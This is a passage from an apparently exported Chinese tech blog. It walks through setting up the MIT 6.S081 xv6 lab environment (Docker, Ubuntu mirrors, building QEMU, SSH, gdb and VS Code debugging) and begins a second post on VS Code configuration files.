下面条语句 </span><span class="token builtin class-name">echo</span> <span class="token string">"add-auto-load-safe-path <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">pwd</span><span class="token variable">)</span></span>/.gdbinit "</span> <span class="token operator">>></span> ~/.gdbinit <span class="token comment"># 第一次执行</span><span class="token function">make</span> <span class="token assign-left variable">CPUS</span><span class="token operator">=</span><span class="token number">1</span> qemu-gdb<span class="token comment"># 第二个 terminal</span><span class="token builtin class-name">cd</span> xv6-labs-2020gdb-multiarch<span class="token comment"># 接下来就和使用 平常的 gdb 一样了， layout split 是一个很棒的用法</span><span class="token comment"># 在 gdb 中输入 kill 即可 退出</span><span class="token comment"># 或者 在第三个 teminal 中输入 pkill -f qemu 也可以退出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://pic.imgdb.cn/item/65a3b3dd871b83018aa931bf.jpg"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315207.jpg"></a></p><h2 id="Apple-Chip"><a href="#Apple-Chip" class="headerlink" title="Apple Chip"></a>Apple Chip</h2><blockquote><p>自己ubuntu容器中也可以这样子一键下载。</p></blockquote><p>在docker中先拉取ubuntu 20.04的镜像，即如下命令，输入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在联网状态下，docker会拉取ubuntu：20。04image,可以输入<code>docker images</code>查看images</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202405271417052.png" alt="image-20240527135756188"></p><p>接下来，我们就开始创建容器并且让这个ubuntu跑起来，这个ubuntu images只是最基本的镜像，损失了很多功能，但是之后可以自己往上面安装软件包，输入以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-itd</span> <span class="token parameter variable">--name</span> MIT_6.s081 ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就会创建一个名为<code>MIT_6.s081</code>的container，然后我们要在里面安装基本的软件</p><pre class="line-numbers language-none"><code class="language-none">apt updateapt install sudo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>装了sudo的权限后（其实也可以不装），打开xv6的官网，复制以下链接，在docker的MIT_6.s081中安装必要依赖：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">git</span> build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完后，在root里面找个地方，clone下实验文件(2020版本的就行)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone git://g.csail.mit.edu/xv6-labs-2020<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在之后便是测试test</p><pre class="line-numbers language-none"><code class="language-none"># cd xv6-labs-2020git checkout utilmake qemu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202405271417061.png" alt="image-20240527141209510"></p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202405271417070.png" alt="image-20240527141221053"></p><p>若是以上则可以认为是tesh成功了！</p><h2 id="如何退出xv6kernel"><a href="#如何退出xv6kernel" class="headerlink" title="如何退出xv6kernel"></a>如何退出xv6kernel</h2><p>回到 monitor 界面：<strong>ctrl + a</strong>，然后按 <strong>c</strong> ，即可退出 xv6 的 shell 界面，进入 QEMU 的 monitor 界面，输入 <strong>q</strong> 按回车即可退出 QEMU。</p><p>终止 QEMU 进程：<strong>ctrl + a</strong>，然后按 <strong>x</strong>，即可终止 QEMU 进程，回到 Shell 界面。</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202405271417078.png" alt="image-20240527141731298"></p><h1 id="Ubuntu安装XV6环境"><a href="#Ubuntu安装XV6环境" class="headerlink" title="Ubuntu安装XV6环境"></a>Ubuntu安装XV6环境</h1><h2 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h2><p>按照上一个说明的流程，安装一个新的虚拟机并记住它的名字。记住<strong>账户名在下文统一用username指代账户名</strong>，下面要更新下载源。</p><ol><li>备份源列表</li></ol><p>Ubuntu配置的默认源并不是国内的服务器，下载更新软件都比较慢。首先备份源列表文件<strong>sources.list</strong>：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text"># 首先备份源列表sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>打开sources.list文件修改</li></ol><p>选择合适的源，替换原文件的内容，保存编辑好的文件, 以阿里云更新服务器为例（可以分别测试阿里云、清华、中科大、163源的速度，选择最快的）：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text"># 打开sources.list文件sudo gedit /etc/apt/sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>编辑**&#x2F;etc&#x2F;apt&#x2F;sources.list**文件, 在文件最前面添加阿里云镜像源：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">#  阿里源deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>刷新列表</li></ol><pre class="line-numbers language-text" data-language="text"><code class="language-text">sudo apt-get updatesudo apt-get upgradesudo apt-get install build-essential<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>下载速度瞬间就起飞了。</p><h2 id="配置riscv-qemu-clone"><a href="#配置riscv-qemu-clone" class="headerlink" title="配置riscv+qemu+clone"></a>配置riscv+qemu+clone</h2><pre><code>//下载必要组件并解压sudo apt install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu libglib2.0-dev libpixman-1-dev gcc-riscv64-unknown-elfwget https://download.qemu.org/qemu-5.1.0.tar.xztar xvf qemu-5.1.0.tar.xzcd qemu-5.1.0</code></pre><p>接下来运行这条命令</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;configure --disable-kvm --disable-werror --prefix&#x3D;&#x2F;usr&#x2F;local --target-list&#x3D;&quot;riscv64-softmmu&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果报这个错误:</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">ERROR: glib-2.48 gthread-2.0 is required to compile QEMU<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解决方法为<code>sudo apt install libglib2.0-dev</code></p><p>还可能报这个错误：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">ERROR: pixman >= 0.21.8 not present.       Please install the pixman devel package.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解决方法为<code>sudo apt install libpixman-1-dev</code></p><p>之后编译,克隆源代码并初始运行</p><pre class="line-numbers language-none"><code class="language-none">makesudo make installcd ~git clone git:&#x2F;&#x2F;g.csail.mit.edu&#x2F;xv6-labs-2020cd xv6-labs-2020git checkout utilmake qemu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="vscode远程调试"><a href="#vscode远程调试" class="headerlink" title="vscode远程调试"></a>vscode远程调试</h2><p>在vscode上安装remote ssh一系列扩展.</p><p>在虚拟机终端输入ifconfig(如果报错就按它的指示去做)并获得地址名得到<strong>inet值</strong></p><p>在vscode中的ssh配置文件中加入以下东西：（或者修改）</p><pre class="line-numbers language-none"><code class="language-none">Host #造一个名字(随便取)HostName # 输入你得到的地址User 用户名字#(ubuntu的账户名字即为username)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在你的windows终端中跑一遍ssh检验是否能够连接虚拟机</p><p>打开cmd,输入以下命令</p><pre class="line-numbers language-none"><code class="language-none">ssh username@&lt;inet的地址&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若报以下错误</p><pre class="line-numbers language-none"><code class="language-none">ssh: connect to host XX.XX.XX.XX port 22: Connection refused<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要开启ssh服务,重启ssh服务(这个报错还挺平凡的,重启下ssh服务一般就能解决)</p><pre class="line-numbers language-none"><code class="language-none">sudo &#x2F;etc&#x2F;init.d&#x2F;ssh startsudo &#x2F;etc&#x2F;init.d&#x2F;ssh stopsudo &#x2F;etc&#x2F;init.d&#x2F;ssh start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在vscode中远程连接虚拟机并输入两次密码(在vscode里面远程连接至主机)</p><p>用vscode打开xv6-labs-2020文件目录并在目录下创建一个.vscode文件夹</p><p>手动新建一个<strong>launch.json</strong>文件,并把以下内容修改username后粘贴</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span><span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"(gdb) 启动"</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"cppdbg"</span><span class="token punctuation">,</span>        <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span>        <span class="token property">"program"</span><span class="token operator">:</span> <span class="token string">"/home/genesis/xv6-labs-2020/kernel/kernel"</span><span class="token punctuation">,</span><span class="token comment">//你的kernel所在的目录</span>        <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment">//可以后续传参</span>        <span class="token property">"stopAtEntry"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//支持断点调试</span>        <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"$&#123;fileDirname&#125;"</span><span class="token punctuation">,</span>        <span class="token property">"miDebuggerServerAddress"</span><span class="token operator">:</span> <span class="token string">"localhost:26000"</span><span class="token punctuation">,</span><span class="token comment">//这是默认端口</span>        <span class="token property">"miDebuggerPath"</span><span class="token operator">:</span> <span class="token string">"/usr/bin/gdb-multiarch"</span><span class="token punctuation">,</span><span class="token comment">//x86环境支持组件</span>        <span class="token property">"environment"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"externalConsole"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"MIMode"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>        <span class="token property">"setupCommands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>            <span class="token punctuation">&#123;</span>                <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"为 gdb 启用整齐打印"</span><span class="token punctuation">,</span>                <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"-enable-pretty-printing"</span><span class="token punctuation">,</span>                <span class="token property">"ignoreFailures"</span><span class="token operator">:</span> <span class="token boolean">true</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"logging"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>            <span class="token property">"engineLogging"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>            <span class="token property">"programOutput"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改gdbinit.teml.riscv:(最后一句支持更广泛的断点调试)(<strong>但目前断点调试好像不成功2023.12.8</strong>)</p><pre class="line-numbers language-none"><code class="language-none">set confirm offset architecture riscv:rv64target remote 127.0.0.1:1234symbol-file kernel&#x2F;kernelset disassemble-next-line autoset riscv use-compressed-breakpoints yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在vscode终端启动qemu:</p><pre class="line-numbers language-none"><code class="language-none">make qemu-gdb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注释gdbinit文件(每次启动qemu都要修改，可以尝试优化)：</p><pre class="line-numbers language-none"><code class="language-none">set confirm offset architecture riscv:rv64#target remote 127.0.0.1:26000symbol-file kernel&#x2F;kernelset disassemble-next-line autoset riscv use-compressed-breakpoints yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按下两次f5并祈祷</p><blockquote><p>参考教程：</p><ol><li><p><a href="https://www.bilibili.com/video/BV11K4y127Qk/?spm_id_from=333.337.search-card.all.click&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">MIT 6S081 环境搭建指南 保姆级教学</a></p></li><li><p><a href="https://www.bilibili.com/video/BV1Lv411g7EV/?spm_id_from=333.788&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">mit6s081 通过vscode来debug kernel</a></p></li></ol></blockquote><h1 id="Grade"><a href="#Grade" class="headerlink" title="Grade"></a>Grade</h1><p>如果make grade失败并报错‘</p><pre class="line-numbers language-none"><code class="language-none">&#39;python&#39;: No such file or directory，<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以进行如下操作</p><pre><code>//查看已安装的python版本python3 --version//查找python3的位置whereis python3//为其创建连接符号(注意观察路径,自己调整)sudo ln -s /usr/bin/python3 /usr/bin/python</code></pre><h2 id="参考学习资料"><a href="#参考学习资料" class="headerlink" title="参考学习资料"></a>参考学习资料</h2><ol><li><a href="https://tarplkpqsm.feishu.cn/docs/doccnBFsXFMsAr1oXEVsaT9E3Jg">一起来学MIT6.S081呀～ - 飞书云文档 (feishu.cn)</a></li><li><a href="https://zhuanlan.zhihu.com/p/624091268">MIT 6.S081 Operating System  - 知乎 (zhihu.com)</a></li><li><a href="https://pdos.csail.mit.edu/6.S081/2020/tools.html">6.S081 &#x2F; Fall 2020 (mit.edu)</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> XV6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VSCODE配置总结</title>
      <link href="/2023/12/05/vs_environment/"/>
      <url>/2023/12/05/vs_environment/</url>
      
        <content type="html"><![CDATA[<h2 id="WINDOWS下对VSCODE的四个文件配置"><a href="#WINDOWS下对VSCODE的四个文件配置" class="headerlink" title="WINDOWS下对VSCODE的四个文件配置"></a>WINDOWS下对VSCODE的四个文件配置</h2><blockquote><p>mingw放在c盘根目录下,安装medium的fira code</p></blockquote><h3 id="c-cpp-properties-json"><a href="#c-cpp-properties-json" class="headerlink" title="c_cpp_properties.json"></a>c_cpp_properties.json</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>          <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Win32"</span><span class="token punctuation">,</span>          <span class="token property">"includePath"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"$&#123;workspaceFolder&#125;/**"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>          <span class="token property">"defines"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"_DEBUG"</span><span class="token punctuation">,</span> <span class="token string">"UNICODE"</span><span class="token punctuation">,</span> <span class="token string">"_UNICODE"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>          <span class="token property">"windowsSdkVersion"</span><span class="token operator">:</span> <span class="token string">"10.0.17763.0"</span><span class="token punctuation">,</span>          <span class="token property">"compilerPath"</span><span class="token operator">:</span> <span class="token string">"C:\\mingw64\\bin\\g++.exe"</span><span class="token punctuation">,</span>            <span class="token property">"cStandard"</span><span class="token operator">:</span> <span class="token string">"c11"</span><span class="token punctuation">,</span>          <span class="token property">"cppStandard"</span><span class="token operator">:</span> <span class="token string">"c++17"</span><span class="token punctuation">,</span>          <span class="token property">"intelliSenseMode"</span><span class="token operator">:</span> <span class="token string">"$&#123;default&#125;"</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token property">"version"</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="launch-json"><a href="#launch-json" class="headerlink" title="launch.json"></a>launch.json</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token comment">// 使用 IntelliSense 了解相关属性。 </span>    <span class="token comment">// 悬停以查看现有属性的描述。</span>    <span class="token comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span>    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"g++.exe build and debug active file"</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"cppdbg"</span><span class="token punctuation">,</span>            <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span>            <span class="token property">"program"</span><span class="token operator">:</span> <span class="token string">"$&#123;workspaceFolder&#125;\\test.exe"</span><span class="token punctuation">,</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"stopAtEntry"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"$&#123;workspaceFolder&#125;"</span><span class="token punctuation">,</span>            <span class="token property">"environment"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"externalConsole"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            <span class="token property">"MIMode"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>            <span class="token property">"miDebuggerPath"</span><span class="token operator">:</span> <span class="token string">"C:\\mingw64\\bin\\gdb.exe"</span><span class="token punctuation">,</span><span class="token comment">/*修改成自己bin目录下的gdb.exe，这里的路径和电脑里复制的文件目录有一点不一样，这里是两个反斜杠\\*/</span>            <span class="token property">"setupCommands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                    <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"为 gdb 启用整齐打印"</span><span class="token punctuation">,</span>                    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"-enable-pretty-printing"</span><span class="token punctuation">,</span>                    <span class="token property">"ignoreFailures"</span><span class="token operator">:</span> <span class="token boolean">true</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"preLaunchTask"</span><span class="token operator">:</span> <span class="token string">"task g++"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="settings-json"><a href="#settings-json" class="headerlink" title="settings.json"></a>settings.json</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token comment">/*editor*/</span>    <span class="token property">"editor.cursorBlinking"</span><span class="token operator">:</span> <span class="token string">"smooth"</span><span class="token punctuation">,</span><span class="token comment">//使编辑器光标的闪烁平滑，有呼吸感</span>    <span class="token property">"editor.formatOnPaste"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//在粘贴时格式化代码</span>    <span class="token property">"editor.formatOnType"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//敲完一行代码自动格式化</span>    <span class="token property">"editor.smoothScrolling"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//使编辑器滚动变平滑</span>    <span class="token property">"editor.tabCompletion"</span><span class="token operator">:</span> <span class="token string">"on"</span><span class="token punctuation">,</span><span class="token comment">//启用Tab补全</span>    <span class="token property">"editor.fontFamily"</span><span class="token operator">:</span> <span class="token string">"'fira code', '思源黑体'"</span><span class="token punctuation">,</span><span class="token comment">//字体设置，个人喜欢Jetbrains Mono作英文字体，思源黑体作中文字体</span>    <span class="token property">"editor.fontSize"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token comment">//设置字体大小</span>    <span class="token property">"editor.fontWeight"</span><span class="token operator">:</span> <span class="token string">"normal"</span><span class="token punctuation">,</span> <span class="token comment">//这个设置字体粗细，可选normal,bold,"100"~"900"等，选择合适的就行</span>    <span class="token property">"editor.fontLigatures"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//启用字体连字</span>    <span class="token property">"editor.detectIndentation"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token comment">//不基于文件内容选择缩进用制表符还是空格</span>    <span class="token comment">/*    因为有时候VSCode的判断是错误的    */</span>    <span class="token property">"editor.insertSpaces"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//敲下Tab键时插入4个空格而不是制表符</span>    <span class="token property">"editor.copyWithSyntaxHighlighting"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token comment">//复制代码时复制纯文本而不是连语法高亮都复制了</span>    <span class="token property">"editor.suggest.snippetsPreventQuickSuggestions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token comment">//这个开不开效果好像都一样，据说是因为一个bug，建议关掉</span>    <span class="token property">"editor.stickyTabStops"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//在缩进上移动光标时四个空格一组来移动，就仿佛它们是制表符(\t)一样</span>    <span class="token property">"editor.wordBasedSuggestions"</span><span class="token operator">:</span> <span class="token string">"off"</span><span class="token punctuation">,</span><span class="token comment">//关闭基于文件中单词来联想的功能（语言自带的联想就够了，开了这个会导致用vscode写MarkDown时的中文引号异常联想）</span>    <span class="token property">"editor.linkedEditing"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//html标签自动重命名（喜大普奔！终于不需要Auto Rename Tag插件了！）</span>    <span class="token property">"editor.wordWrap"</span><span class="token operator">:</span> <span class="token string">"on"</span><span class="token punctuation">,</span><span class="token comment">//在文件内容溢出vscode显示区域时自动折行</span>    <span class="token property">"editor.cursorSmoothCaretAnimation"</span><span class="token operator">:</span> <span class="token string">"on"</span><span class="token punctuation">,</span><span class="token comment">//让光标移动、插入变得平滑</span>    <span class="token property">"editor.renderControlCharacters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//编辑器中显示不可见的控制字符</span>    <span class="token property">"editor.renderWhitespace"</span><span class="token operator">:</span> <span class="token string">"boundary"</span><span class="token punctuation">,</span><span class="token comment">//除了两个单词之间用于分隔单词的一个空格，以一个小灰点的样子使空格可见</span>    <span class="token comment">/*terminal*/</span>    <span class="token property">"terminal.integrated.defaultProfile.windows"</span><span class="token operator">:</span> <span class="token string">"Command Prompt"</span><span class="token punctuation">,</span><span class="token comment">//将终端设为cmd，个人比较喜欢cmd作为终端</span>    <span class="token property">"terminal.integrated.cursorBlinking"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//终端光标闪烁</span>    <span class="token property">"terminal.integrated.rightClickBehavior"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span><span class="token comment">//在终端中右键时显示菜单而不是粘贴（个人喜好）</span>    <span class="token comment">/*files*/</span>    <span class="token property">"files.autoGuessEncoding"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//让VScode自动猜源代码文件的编码格式</span>    <span class="token property">"files.autoSave"</span><span class="token operator">:</span> <span class="token string">"onFocusChange"</span><span class="token punctuation">,</span><span class="token comment">//在编辑器失去焦点时自动保存，这使自动保存近乎达到“无感知”的体验</span>    <span class="token property">"files.exclude"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token comment">//隐藏一些碍眼的文件夹</span>        <span class="token property">"**/.git"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"**/.svn"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"**/.hg"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"**/CVS"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"**/.DS_Store"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"**/tmp"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"**/node_modules"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"**/bower_components"</span><span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"files.watcherExclude"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token comment">//不索引一些不必要索引的大文件夹以减少内存和CPU消耗</span>        <span class="token property">"**/.git/objects/**"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"**/.git/subtree-cache/**"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"**/node_modules/**"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"**/tmp/**"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"**/bower_components/**"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"**/dist/**"</span><span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">/*workbench*/</span>    <span class="token property">"workbench.list.smoothScrolling"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//使文件列表滚动变平滑</span>    <span class="token property">"workbench.editor.enablePreview"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token comment">//打开文件时不是“预览”模式，即在编辑一个文件时打开编辑另一个文件不会覆盖当前编辑的文件而是新建一个标签页</span>    <span class="token property">"workbench.editor.wrapTabs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">//隐藏新建无标题文件时的“选择语言？”提示（个人喜好，可以删掉此行然后Ctrl+N打开无标题新文件看看不hidden的效果）</span>    <span class="token comment">/*explorer*/</span>    <span class="token property">"explorer.confirmDelete"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token comment">//删除文件时不弹出确认弹窗（因为很烦）</span>    <span class="token property">"explorer.confirmDragAndDrop"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token comment">//往左边文件资源管理器拖动东西来移动/复制时不显示确认窗口（因为很烦）</span>    <span class="token comment">/*search*/</span>    <span class="token property">"search.followSymlinks"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token 